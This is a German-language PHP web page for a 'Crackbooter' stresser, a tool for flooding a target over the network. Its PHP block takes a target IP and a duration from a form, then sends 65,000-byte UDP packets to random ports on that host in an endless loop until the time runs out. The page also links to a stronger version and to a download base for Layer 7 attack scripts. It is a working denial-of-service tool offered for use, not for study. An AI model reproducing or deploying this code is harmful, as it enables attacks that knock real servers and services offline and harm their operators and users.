<html>
	<head>
		<title>~Crackbooter~</title>
		<link href="css/bootstrap.css" rel="stylesheet">
		<link href="css/style.css" rel="stylesheet">
		<!-- Counter -->
		<a href='http://www.blogutils.net/olct/' id='lnolt_' target='_blank' style='font-family:Verdana;font-size:17px;font-weight:bold;text-decoration:none;color:lime'>
		<script language='JavaScript' src='http://blogutils.net/olct/online.php?site=discover-santos.de/gg&interval=600'></script></a><a href='http://www.blogutils.net/' target='_blank' style='font-family:Verdana;font-size:17px;font-weight:bold;text-decoration:none;color:lime'> online</a>
		<!-- Counter -->
	</head>
<body>
<img src= "http://discover-santos.de/gg/crackstresser.gif" alt="test"/>
<?php
    
    if(isset($_GET['host'])&&isset($_GET['time'])){
        $packets = 0;
        ignore_user_abort(TRUE);
        set_time_limit(0);
        $exec_time = $_GET['time'];
        $time = time();
        $max_time = $time+$exec_time;
        $host = $_GET['host'];
        for($i=0;$i<65000;$i++){
            $out .= 'X';
        }

        while(1){
            $packets++;
            
            if(time() > $max_time){
                break;
            }

            $rand = rand(1,65000);
            $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
            
            if($fp){
                fwrite($fp, $out);
                fclose($fp);
            }

        }

        echo "<br><b>Crackbooter</b><br>Boot abgeschlossen $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
        echo '<br><br>
    <form action="'.$surl.'" method=GET>
    <input type="hidden" name="act" value="phptools">
    Host: <br><input type=text name=host><br>
    Length (seconds): <br><input type=text name=time><br>
    <input type=submit value=Go></form>';
    } else {
        echo '<p><p>Crackbooter</p><p>
    <form action=? method=GET>
    <input type="hidden" name="act" value="phptools">
    IP Adresse: <br><input type=text name=host value=><br>
    Sekunden: <br><input type=text name=time value=><br><br>
    <input type=submit value=DownIT></form>';
    }

    ?>

<script language=JavaScript>
<!--

var message="Geh woanders kopieren.";

///////////////////////////////////
function clickIE4(){
if (event.button==2){
alert(message);
return false;
}
}

function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
alert(message);
return false;
}
}
}

if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}

document.oncontextmenu=new Function("alert(message);return false")

// --> 
</script>
        </div>
    </form>
</div>
<div id="player"></div>

<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/56f5e714bab9e0702ae74090/default';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->

	  <section>
	    <a id="top-left" href="http://discover-santos.de/gg2">
	      <div class="sub">
	        <p>
	        Nicht Stark genug?<br />	
	        </p>
	      </div>
	    </a>

	  <section>
	    <a id="top-left" href="http://discover-santos.de/dlbase">
	      <div class="sub">
	        <p>
	        Downloadbase für Layer 7 Script's<br />	
	        </p>
	      </div>
	    </a>

<script type="text/javascript">
document.onkeydown = function (cc) {
if(cc.which == 85){
return false;
}
if(cc.which == 80){
return false;
}
}
</script>

<a id="1128781" href="http://www.crackboard.win">Besucherzähler</a><script type="text/javascript" language="JavaScript" src="http://www.gratis-besucherzaehler.net/counter_js.php?account=1128781&style=12"></script>


</font>
</center>
</body>
</html>
